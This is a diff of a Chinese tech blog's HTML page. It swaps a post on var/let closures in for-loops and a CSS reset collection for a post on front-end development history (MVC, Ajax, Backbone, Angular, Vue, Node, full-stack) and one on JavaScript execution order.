@@ -65,10 +65,10 @@
       <div class="outer">
         <section id="main">
   
-    <article id="post-学习ES6时for遇到循环的困惑" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-前端开发的历史和趋势" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2016/11/16/学习ES6时for遇到循环的困惑.html" class="article-date">
-  <time datetime="2016-11-16T04:56:00.000Z" itemprop="datePublished">2016-11-16</time>
+    <a href="/2016/11/25/前端开发的历史和趋势.html" class="article-date">
+  <time datetime="2016-11-25T02:28:00.000Z" itemprop="datePublished">2016-11-25</time>
 </a>
     
   </div>
@@ -79,7 +79,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2016/11/16/学习ES6时for遇到循环的困惑.html">学习ES6时for遇到循环的困惑</a>
+      <a class="article-title" href="/2016/11/25/前端开发的历史和趋势.html">前端开发的历史和趋势</a>
     </h1>
   
 
@@ -87,27 +87,209 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>在读 《ECMAScript 6 入门》篇头就遇到了一个比较基础的问题，尴尬。。。</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> a = [];</div><div class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</div><div class="line">  a[i] = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="built_in">console</span>.log(i);</div><div class="line">  &#125;;</div><div class="line">&#125;</div><div class="line">a[<span class="number">6</span>](); <span class="comment">//out： 10</span></div></pre></td></tr></table></figure>
-<p>为什么是10呢？不应该是9吗？这点困惑不解。</p>
-<p>为此多做了几次测试<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> a = [];</div><div class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</div><div class="line">   a[i] = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">      <span class="built_in">console</span>.log(i); </div><div class="line">   &#125;;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="built_in">console</span>.log(a)<span class="comment">//our function...</span></div><div class="line"></div><div class="line">a[<span class="number">1</span>]();<span class="comment">//out： 10</span></div><div class="line">a[<span class="number">9</span>]();<span class="comment">//out： 10</span></div><div class="line">a[<span class="number">10</span>]();<span class="comment">//out：err a[10] is not a function</span></div></pre></td></tr></table></figure></p>
-<blockquote>
-<p>结论</p>
-</blockquote>
-<p>后面的 a[1]、a[9] 会再一次循环，而 i 变量此时已经是9，for 循环执行完毕了。</p>
-<p>因为 在这里 var  i 声明的变量为全局变量，for循环之外还能调用。</p>
-<p>在执行 a<a href="">1</a> 时，for 中的 i 已经是 9，结果输出的就为10了。</p>
-<p>这是个很基础的问题，记录下。</p>
-<p>如果作者的结论是错的，请下方留言指正。</p>
+        <h1 id="前端开发的历史和趋势"><a href="#前端开发的历史和趋势" class="headerlink" title="前端开发的历史和趋势"></a>前端开发的历史和趋势</h1><hr>
+<h2 id="什么是前端"><a href="#什么是前端" class="headerlink" title="什么是前端"></a>什么是前端</h2><ul>
+<li>前端：针对浏览器的开发，代码在浏览器运行</li>
+<li>后端：针对服务器的开发，代码在服务器运行</li>
+</ul>
+<p><img src="https://github.com/ruanyf/jstraining/raw/master/docs/images/frontend.png" alt="前后端"></p>
 <hr>
-<p>再看看let的情况如何</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> a = [];</div><div class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</div><div class="line">  a[i] = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="built_in">console</span>.log(i);</div><div class="line">  &#125;;</div><div class="line">&#125;</div><div class="line">a[<span class="number">6</span>](); <span class="comment">//out： 6</span></div></pre></td></tr></table></figure>
-<p>上面代码中，变量 i 是let声明的，当前的i只在本轮循环有效，所以每一次循环的 i 其实都是一个新的变量，所以最后输出的是6。</p>
+<h2 id="前后端不分的时代"><a href="#前后端不分的时代" class="headerlink" title="前后端不分的时代"></a>前后端不分的时代</h2><p>互联网发展的早期，前后端开发是一体的，前端代码是后端代码的一部分。</p>
+<ol>
+<li>后端收到浏览器的请求</li>
+<li>生成静态页面</li>
+<li>发送到浏览器</li>
+</ol>
+<hr>
+<h2 id="后端-MVC-的开发模式"><a href="#后端-MVC-的开发模式" class="headerlink" title="后端 MVC 的开发模式"></a>后端 MVC 的开发模式</h2><p>那时的网站开发，采用的是后端 MVC 模式。</p>
+<ul>
+<li>Model（模型层）：提供/保存数据</li>
+<li>Controller（控制层）：数据处理，实现业务逻辑</li>
+<li>View（视图层）：展示数据，提供用户界面</li>
+</ul>
+<p>前端只是后端 MVC 的 V。</p>
+<hr>
+<p>以 PHP 框架 Laravel 为例。</p>
+<p><img src="https://github.com/ruanyf/jstraining/raw/master/docs/images/laravel-mvc.png" alt="后端 MVC 的开发模式"></p>
+<hr>
+<h2 id="前端工程师的角色"><a href="#前端工程师的角色" class="headerlink" title="前端工程师的角色"></a>前端工程师的角色</h2><p>那时的前端工程师，实际上是模板工程师，负责编写页面模板。</p>
+<p>后端代码读取模板，替换变量，渲染出页面。</p>
+<hr>
+<h2 id="典型的-PHP-模板"><a href="#典型的-PHP-模板" class="headerlink" title="典型的 PHP 模板"></a>典型的 PHP 模板</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">&lt;html&gt;</div><div class="line">  &lt;head&gt;&lt;title&gt;Car &#123;&#123; $car-&gt;id &#125;&#125;&lt;/title&gt;&lt;/head&gt;</div><div class="line">  &lt;body&gt;</div><div class="line">    &lt;h1&gt;Car &#123;&#123; $car-&gt;id &#125;&#125;&lt;/h1&gt;</div><div class="line">    &lt;ul&gt;</div><div class="line">      &lt;li&gt;Make: &#123;&#123; $car-&gt;make &#125;&#125;&lt;/li&gt;</div><div class="line">      &lt;li&gt;Model: &#123;&#123; $car-&gt;model &#125;&#125;&lt;/li&gt;</div><div class="line">      &lt;li&gt;Produced on: &#123;&#123; $car-&gt;produced_on &#125;&#125;&lt;/li&gt;</div><div class="line">    &lt;/ul&gt;</div><div class="line">  &lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure>
+<hr>
+<h2 id="Ajax"><a href="#Ajax" class="headerlink" title="Ajax"></a>Ajax</h2><p>Ajax 技术诞生，改变了一切。</p>
+<ul>
+<li>2004年：Gmail</li>
+<li>2005年：Google 地图</li>
+</ul>
+<p>前端不再是后端的模板，可以独立得到各种数据。</p>
+<hr>
+<h2 id="Web-2-0"><a href="#Web-2-0" class="headerlink" title="Web 2.0"></a>Web 2.0</h2><p>Ajax 技术促成了 Web 2.0 的诞生。</p>
+<p><img src="https://github.com/ruanyf/jstraining/raw/master/docs/images/web20.gif" alt=""></p>
+<ul>
+<li>Web 1.0：静态网页，纯内容展示</li>
+<li>Web 2.0：动态网页，富交互，前端数据处理</li>
+</ul>
+<p>从那时起，前端变得复杂了，对前端工程师的要求越来越高。</p>
+<hr>
+<h2 id="前端-MVC-框架"><a href="#前端-MVC-框架" class="headerlink" title="前端 MVC 框架"></a>前端 MVC 框架</h2><p>前端通过 Ajax 得到数据，因此也有了处理数据的需求。</p>
+<p>前端代码变得也需要保存数据、处理数据、生成视图，这导致了前端 MVC 框架的诞生。</p>
+<ul>
+<li>2010年，Backbone.js</li>
+</ul>
+<p><img src="https://github.com/ruanyf/jstraining/raw/master/docs/images/backbone.png" alt=""></p>
+<hr>
+<h2 id="Backbone-js"><a href="#Backbone-js" class="headerlink" title="Backbone.js"></a>Backbone.js</h2><p>Backbone 将前端代码分成两个基本部分。</p>
+<ul>
+<li>Model：管理数据</li>
+<li>View：数据的展现</li>
+</ul>
+<p><img src="https://github.com/ruanyf/jstraining/raw/master/docs/images/backbone-model-view.png" alt="Backbone 将前端代码分成两个基本部分"></p>
+<hr>
+<h2 id="前端-Controller"><a href="#前端-Controller" class="headerlink" title="前端 Controller"></a>前端 Controller</h2><p>Backbone 只有 M 和 V，没有 C。因为，前端 Controller 与后端不同。</p>
+<ul>
+<li>不需要，也不应该处理业务逻辑</li>
+<li>只需要处理 UI 逻辑，响应用户的一举一动</li>
+</ul>
+<p>所以，前端 Controller 相对比较简单。Backbone 没有 C，只用事件来处理 UI 逻辑。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> AppView = Backbone.View.extend(&#123;</div><div class="line">  <span class="comment">// ...</span></div><div class="line">  events: &#123;</div><div class="line">    <span class="string">"keypress #new-todo"</span>:  <span class="string">"createOnEnter"</span>,</div><div class="line">    <span class="string">"click #clear-completed"</span>: <span class="string">"clearCompleted"</span>,</div><div class="line">    <span class="string">"click #toggle-all"</span>: <span class="string">"toggleAllComplete"</span></div><div class="line">  &#125;,</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<hr>
+<h2 id="Router"><a href="#Router" class="headerlink" title="Router"></a>Router</h2><p>前端还有一种天然的方法，可以切换视图，那就是 URL。</p>
+<p>通过 URL 切换视图，这就是 Router（路由）的作用。以 Backbone 为例。</p>
+<p><img src="https://github.com/ruanyf/jstraining/raw/master/docs/images/backbone-routing.png" alt="Router"></p>
+<hr>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">App.Router = Backbone.Router.extend(&#123;</div><div class="line">  <span class="attr">routes</span>: &#123;</div><div class="line">    <span class="string">''</span>: <span class="string">'index'</span>,</div><div class="line">    <span class="string">'show'</span>: <span class="string">'show'</span></div><div class="line">    &#125;,</div><div class="line">  <span class="attr">index</span>: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">    $(<span class="built_in">document</span>.body).append(<span class="string">"调用了 Index 路由"</span>);</div><div class="line">  &#125;,</div><div class="line">  <span class="attr">show</span>: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">    $(<span class="built_in">document</span>.body).append(<span class="string">"调用了 Show 路由"</span>);</div><div class="line">  &#125;,</div><div class="line">&#125;);</div></pre></td></tr></table></figure>
+<hr>
+<h2 id="示例：Backbone-Router"><a href="#示例：Backbone-Router" class="headerlink" title="示例：Backbone Router"></a>示例：Backbone Router</h2><p>打开<code>demos/backbone-demo/index.html</code>，按照<a href="https://github.com/ruanyf/jstraining/blob/master/demos/README.md#backbone" target="_blank" rel="external">《操作说明》</a>，查看示例。</p>
+<p><img src="https://github.com/ruanyf/jstraining/raw/master/docs/images/backbone-demo.png" alt="Backbone Router"></p>
+<hr>
+<h2 id="MVVM-模式"><a href="#MVVM-模式" class="headerlink" title="MVVM 模式"></a>MVVM 模式</h2><p>另一些框架提出 MVVM 模式，用 View Model 代替 Controller。</p>
+<ul>
+<li>Model</li>
+<li>View</li>
+<li>View-Model：简化的 Controller，唯一作用就是为 View 提供处理好的数据，不含其他逻辑。</li>
+</ul>
+<p>本质：view 绑定 view-model，视图与数据模型强耦合。数据的变化实时反映在 view 上，不需要手动处理。</p>
+<p><img src="https://github.com/ruanyf/jstraining/raw/master/docs/images/mvvm.png" alt="MVVM 模式"></p>
+<hr>
+<h2 id="SPA"><a href="#SPA" class="headerlink" title="SPA"></a>SPA</h2><p>前端可以做到：</p>
+<blockquote>
+<ul>
+<li>读写数据</li>
+<li>切换视图</li>
+<li>用户交互</li>
+</ul>
+</blockquote>
+<p>这意味着，网页其实是一个应用程序。</p>
+<blockquote>
+<p>SPA = Single-page application</p>
+</blockquote>
+<p>2010年后，前端工程师从开发页面，变成了开发”前端应用“（跑在浏览器里面的应用程序）。</p>
+<hr>
+<h2 id="Angular"><a href="#Angular" class="headerlink" title="Angular"></a>Angular</h2><p>Google 公司推出的 Angular 是最流行的 MVVM 前端框架。</p>
+<p>它的风格属于 HTML 语言的增强，核心概念是双向绑定。</p>
+<p><img src="https://github.com/ruanyf/jstraining/raw/master/docs/images/angular.png" alt="Google 公司推出的 Angular 是最流行的 MVVM 前端框架"></p>
+<hr>
+<h2 id="示例：Angular-的双向绑定"><a href="#示例：Angular-的双向绑定" class="headerlink" title="示例：Angular 的双向绑定"></a>示例：Angular 的双向绑定</h2><p>浏览器打开<code>demos/angular-demo/index.html</code>，可以看到一个输入框。</p>
+<p><img src="https://github.com/ruanyf/jstraining/raw/master/docs/images/angular-demo.png" alt="示例：Angular 的双向绑定"></p>
+<hr>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">&lt;div ng-app=<span class="string">""</span>&gt;</div><div class="line">  <span class="xml"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span></div><div class="line">    姓名 :</div><div class="line">    <span class="tag">&lt;<span class="name">input</span></span></div><div class="line">      <span class="attr">type</span>=<span class="string">"text"</span></div><div class="line">      <span class="attr">ng-model</span>=<span class="string">"name"</span></div><div class="line">      <span class="attr">placeholder</span>=<span class="string">"在这里输入您的大名"</span></div><div class="line">    &gt;</div><div class="line">  <span class="tag">&lt;/<span class="name">p</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">h1</span>&gt;</span>你好，&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div></pre></td></tr></table></figure>
+<hr>
+<h2 id="Vue"><a href="#Vue" class="headerlink" title="Vue"></a>Vue</h2><p>Vue.js 是现在很热门的一种前端 MVVM 框架。</p>
+<p>它的基本思想与 Angular 类似，但是用法更简单，而且引入了响应式编程的概念。</p>
+<p><img src="https://github.com/ruanyf/jstraining/raw/master/docs/images/vue-logo.png" alt="Vue.js 是现在很热门的一种前端 MVVM 框架"></p>
+<hr>
+<h2 id="示例：Vue-的双向绑定"><a href="#示例：Vue-的双向绑定" class="headerlink" title="示例：Vue 的双向绑定"></a>示例：Vue 的双向绑定</h2><p>Vue 的模板与数据，是双向绑定的。</p>
+<p>打开<code>demos/vue-demo/index1.html</code>，按照<a href="https://github.com/ruanyf/jstraining/blob/master/demos/README.md#vue" target="_blank" rel="external">《操作说明》</a>，查看示例。</p>
+<p><img src="https://github.com/ruanyf/jstraining/raw/master/docs/images/vue-demo.png" alt="Vue 的模板与数据，是双向绑定的"></p>
+<hr>
+<p>HTML 代码</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"journal"</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">v-model</span>=<span class="string">"message"</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;&#123;message&#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div></pre></td></tr></table></figure>
+<p>JS 代码</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> journal = <span class="keyword">new</span> Vue(&#123;</div><div class="line">  <span class="attr">el</span>: <span class="string">'#journal'</span>,</div><div class="line">  <span class="attr">data</span>: &#123;</div><div class="line">    <span class="attr">message</span>: <span class="string">'Your first entry'</span></div><div class="line">  &#125;</div><div class="line">&#125;);</div></pre></td></tr></table></figure>
+<hr>
+<h2 id="前后端分离"><a href="#前后端分离" class="headerlink" title="前后端分离"></a>前后端分离</h2><ul>
+<li>Ajax -&gt; 前端应用兴起</li>
+<li>智能手机 -&gt; 多终端支持</li>
+</ul>
+<p>这两个原因，导致前端开发方式发生根本的变化。</p>
+<p>前端不再是后端 MVC 中的 V，而是单独的一层。</p>
+<hr>
+<h2 id="REST-接口"><a href="#REST-接口" class="headerlink" title="REST 接口"></a>REST 接口</h2><p>前后端分离以后，它们之间通过接口通信。</p>
+<p>后端暴露出接口，前端消费后端提供的数据。</p>
+<p>后端接口一般是 REST 形式，前后端的通信协议一般是 HTTP。</p>
+<hr>
+<h2 id="Node"><a href="#Node" class="headerlink" title="Node"></a>Node</h2><p>2009年，Node 项目诞生，它是服务器上的 JavaScript 运行环境。</p>
+<p>Node = JavaScript + 操作系统 API</p>
+<p><img src="https://github.com/ruanyf/jstraining/raw/master/docs/images/node-logo.png" alt="服务器上的 JavaScript 运行环境"></p>
+<hr>
+<h2 id="Node-的意义"><a href="#Node-的意义" class="headerlink" title="Node 的意义"></a>Node 的意义</h2><ul>
+<li>JavaScript 成为服务器脚本语言，与 Python 和 Ruby 一样</li>
+<li>JavaScript 成为唯一的浏览器和服务器都支持的语言</li>
+<li>前端工程师可以编写后端程序了</li>
+</ul>
+<hr>
+<h2 id="前端开发模式的根本改变"><a href="#前端开发模式的根本改变" class="headerlink" title="前端开发模式的根本改变"></a>前端开发模式的根本改变</h2><ul>
+<li>Node 环境下开发</li>
+<li>大量使用服务器端工具</li>
+<li>引入持续集成等软件工程的标准流程</li>
+<li>开发完成后，编译成浏览器可以运行的脚本，放上 CDN</li>
+</ul>
+<hr>
+<h2 id="全栈工程师"><a href="#全栈工程师" class="headerlink" title="全栈工程师"></a>全栈工程师</h2><p>前端工程师正在转变为全栈工程师</p>
+<ul>
+<li>一个人负责开发前端和后端</li>
+<li>从数据库到 UI 的所有开发</li>
+</ul>
+<hr>
+<h2 id="全栈技能"><a href="#全栈技能" class="headerlink" title="全栈技能"></a>全栈技能</h2><p>怎样才能称为全栈工程师？</p>
+<ul>
+<li>传统前端技能：HTML、JavaScript、CSS</li>
+<li>一门后端语言</li>
+<li>移动端开发：iOS / Android / HTML5</li>
+<li>其他技能：数据库、HTTP 等等</li>
+</ul>
+<hr>
+<h2 id="软件行业的发展动力"><a href="#软件行业的发展动力" class="headerlink" title="软件行业的发展动力"></a>软件行业的发展动力</h2><p>历史演变：前后端不分 -&gt; 前后端分离 -&gt; 全栈工程师</p>
+<p>动力：更加产业化、大规模地生产软件</p>
+<ul>
+<li>效率更高</li>
+<li>成本更低</li>
+</ul>
+<p>通用性好、能够快速产出的技术最终会赢，单个程序员的生产力要求越来越高。</p>
+<hr>
+<h2 id="H5-就是一个最好的例子"><a href="#H5-就是一个最好的例子" class="headerlink" title="H5 就是一个最好的例子"></a>H5 就是一个最好的例子</h2><p>为什么 H5 技术会赢得移动端？</p>
+<ul>
+<li>开发速度快：Native 需要重新编译才能看到结果，H5 是即时输出</li>
+<li>开发成本低：Native 需要两个开发团队，H5 只要一个</li>
+<li>快速发布：安卓 Native 新版本需要24小时，iOS 需要 3 ～ 4 天，H5 可以随时更新</li>
+</ul>
+<hr>
+<h2 id="未来软件的特点"><a href="#未来软件的特点" class="headerlink" title="未来软件的特点"></a>未来软件的特点</h2><ul>
+<li>联网</li>
+<li>高并发</li>
+<li>分布式</li>
+<li>跨终端</li>
+</ul>
+<p>现在基于 Web 的前端技术，将演变为未来所有软件的通用的 GUI 解决方案。</p>
+<hr>
+<h2 id="未来只有两种软件工程师"><a href="#未来只有两种软件工程师" class="headerlink" title="未来只有两种软件工程师"></a>未来只有两种软件工程师</h2><ul>
+<li>端工程师<ul>
+<li>手机端</li>
+<li>PC 端</li>
+<li>TV 端</li>
+<li>VR 端</li>
+<li>……</li>
+</ul>
+</li>
+<li>云工程师</li>
+</ul>
+<p>-摘自于  <a href="https://github.com/ruanyf/jstraining/blob/master/docs/history.md" title="阮一峰 博客" target="_blank" rel="external">阮一峰 博客</a></p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://dodoing.com/2016/11/16/学习ES6时for遇到循环的困惑.html" data-id="cj4qlfs7z0016moe9nuso3q1u" class="article-share-link">Partager</a>
+      <a data-url="http://dodoing.com/2016/11/25/前端开发的历史和趋势.html" data-id="cj4ruszur0014v0e973dhy4ns" class="article-share-link">Partager</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/javascript/">javascript</a></li></ul>
@@ -119,10 +301,10 @@
 
 
   
-    <article id="post-各大网站CSS代码初始化整理版" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-js的执行过程，预解析与执行" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2016/11/04/各大网站CSS代码初始化整理版.html" class="article-date">
-  <time datetime="2016-11-04T10:43:00.000Z" itemprop="datePublished">2016-11-04</time>
+    <a href="/2016/11/22/js的执行过程，预解析与执行.html" class="article-date">
+  <time datetime="2016-11-22T10:51:00.000Z" itemprop="datePublished">2016-11-22</time>
 </a>
     
   </div>
@@ -133,7 +315,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2016/11/04/各大网站CSS代码初始化整理版.html">各大网站CSS代码初始化整理版</a>
+      <a class="article-title" href="/2016/11/22/js的执行过程，预解析与执行.html">js的执行过程，预解析与执行</a>
     </h1>
   
 
@@ -141,25 +323,43 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p><strong>css初始化重新整理版</strong></p>
-<p><strong>众所周知，浏览器种类的繁多，带来各种各样的独自的“特色”问题，一直是前端界开发者非常头痛的问题。</strong></p>
-<p><strong>所以我们要把浏览器默认的特色样式初始化。</strong></p>
-<p>以下是几个著名网站的初始化样式</p>
+        <p>先来个定义吧</p>
+<p>JavaScript是一种描述型脚本语言。</p>
+<p>它不同于java或C#等编译性语言,它不需要进行编译成中间语言,而是由浏览器进行动态地解析与执行。</p>
+<p>好了，下面说说 JavaScript 的执行顺序</p>
 <blockquote>
-<p>腾讯QQ官网 样式初始化<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">body</span>,<span class="selector-tag">ol</span>,<span class="selector-tag">ul</span>,<span class="selector-tag">h1</span>,<span class="selector-tag">h2</span>,<span class="selector-tag">h3</span>,<span class="selector-tag">h4</span>,<span class="selector-tag">h5</span>,<span class="selector-tag">h6</span>,<span class="selector-tag">p</span>,<span class="selector-tag">th</span>,<span class="selector-tag">td</span>,<span class="selector-tag">dl</span>,<span class="selector-tag">dd</span>,<span class="selector-tag">form</span>,<span class="selector-tag">fieldset</span>,<span class="selector-tag">legend</span>,<span class="selector-tag">input</span>,<span class="selector-tag">textarea</span>,<span class="selector-tag">select</span>&#123;<span class="attribute">margin</span>:<span class="number">0</span>;<span class="attribute">padding</span>:<span class="number">0</span>&#125; </div><div class="line"><span class="selector-tag">body</span>&#123;<span class="attribute">font</span>:<span class="number">12px</span><span class="string">"宋体"</span>,<span class="string">"Arial Narrow"</span>,HELVETICA;<span class="attribute">background</span>:<span class="number">#fff</span>;<span class="attribute">-webkit-text-size-adjust</span>:<span class="number">100%</span>;&#125; </div><div class="line"><span class="selector-tag">a</span>&#123;<span class="attribute">color</span>:<span class="number">#2d374b</span>;<span class="attribute">text-decoration</span>:none&#125; </div><div class="line"><span class="selector-tag">a</span><span class="selector-pseudo">:hover</span>&#123;<span class="attribute">color</span>:<span class="number">#cd0200</span>;<span class="attribute">text-decoration</span>:underline&#125; </div><div class="line"><span class="selector-tag">em</span>&#123;<span class="attribute">font-style</span>:normal&#125; </div><div class="line"><span class="selector-tag">li</span>&#123;<span class="attribute">list-style</span>:none&#125; </div><div class="line"><span class="selector-tag">img</span>&#123;<span class="attribute">border</span>:<span class="number">0</span>;<span class="attribute">vertical-align</span>:middle&#125; </div><div class="line"><span class="selector-tag">table</span>&#123;<span class="attribute">border-collapse</span>:collapse;<span class="attribute">border-spacing</span>:<span class="number">0</span>&#125; </div><div class="line"><span class="selector-tag">p</span>&#123;<span class="attribute">word-wrap</span>:break-word&#125;</div></pre></td></tr></table></figure></p>
-<p>新浪官网 样式初始化<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">body</span>,<span class="selector-tag">ul</span>,<span class="selector-tag">ol</span>,<span class="selector-tag">li</span>,<span class="selector-tag">p</span>,<span class="selector-tag">h1</span>,<span class="selector-tag">h2</span>,<span class="selector-tag">h3</span>,<span class="selector-tag">h4</span>,<span class="selector-tag">h5</span>,<span class="selector-tag">h6</span>,<span class="selector-tag">form</span>,<span class="selector-tag">fieldset</span>,<span class="selector-tag">table</span>,<span class="selector-tag">td</span>,<span class="selector-tag">img</span>,<span class="selector-tag">div</span>&#123;<span class="attribute">margin</span>:<span class="number">0</span>;<span class="attribute">padding</span>:<span class="number">0</span>;<span class="attribute">border</span>:<span class="number">0</span>;&#125; </div><div class="line"><span class="selector-tag">body</span>&#123;<span class="attribute">background</span>:<span class="number">#fff</span>;<span class="attribute">color</span>:<span class="number">#333</span>;<span class="attribute">font-size</span>:<span class="number">12px</span>; <span class="attribute">margin-top</span>:<span class="number">5px</span>;<span class="attribute">font-family</span>:<span class="string">"SimSun"</span>,<span class="string">"宋体"</span>,<span class="string">"Arial Narrow"</span>;&#125; </div><div class="line"> </div><div class="line"><span class="selector-tag">ul</span>,<span class="selector-tag">ol</span>&#123;<span class="attribute">list-style-type</span>:none;&#125; </div><div class="line"><span class="selector-tag">select</span>,<span class="selector-tag">input</span>,<span class="selector-tag">img</span>,<span class="selector-tag">select</span>&#123;<span class="attribute">vertical-align</span>:middle;&#125; </div><div class="line"> </div><div class="line"><span class="selector-tag">a</span>&#123;<span class="attribute">text-decoration</span>:none;&#125; </div><div class="line"><span class="selector-tag">a</span><span class="selector-pseudo">:link</span>&#123;<span class="attribute">color</span>:<span class="number">#009</span>;&#125; </div><div class="line"><span class="selector-tag">a</span><span class="selector-pseudo">:visited</span>&#123;<span class="attribute">color</span>:<span class="number">#800080</span>;&#125; </div><div class="line"><span class="selector-tag">a</span><span class="selector-pseudo">:hover</span>,<span class="selector-tag">a</span><span class="selector-pseudo">:active</span>,<span class="selector-tag">a</span><span class="selector-pseudo">:focus</span>&#123;<span class="attribute">color</span>:<span class="number">#c00</span>;<span class="attribute">text-decoration</span>:underline;&#125;</div></pre></td></tr></table></figure></p>
-<p>淘宝官网 样式初始化<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">body</span>, <span class="selector-tag">h1</span>, <span class="selector-tag">h2</span>, <span class="selector-tag">h3</span>, <span class="selector-tag">h4</span>, <span class="selector-tag">h5</span>, <span class="selector-tag">h6</span>, <span class="selector-tag">hr</span>, <span class="selector-tag">p</span>, <span class="selector-tag">blockquote</span>, <span class="selector-tag">dl</span>, <span class="selector-tag">dt</span>, <span class="selector-tag">dd</span>, <span class="selector-tag">ul</span>, <span class="selector-tag">ol</span>, <span class="selector-tag">li</span>, <span class="selector-tag">pre</span>, <span class="selector-tag">form</span>, <span class="selector-tag">fieldset</span>, <span class="selector-tag">legend</span>, <span class="selector-tag">button</span>, <span class="selector-tag">input</span>, <span class="selector-tag">textarea</span>, <span class="selector-tag">th</span>, <span class="selector-tag">td</span> &#123; <span class="attribute">margin</span>:<span class="number">0</span>; <span class="attribute">padding</span>:<span class="number">0</span>; &#125; </div><div class="line"><span class="selector-tag">body</span>, <span class="selector-tag">button</span>, <span class="selector-tag">input</span>, <span class="selector-tag">select</span>, <span class="selector-tag">textarea</span> &#123; <span class="attribute">font</span>:<span class="number">12px</span>/<span class="number">1.5</span>tahoma, arial, \<span class="number">5</span>b8b\<span class="number">4</span>f53; &#125; </div><div class="line"><span class="selector-tag">h1</span>, <span 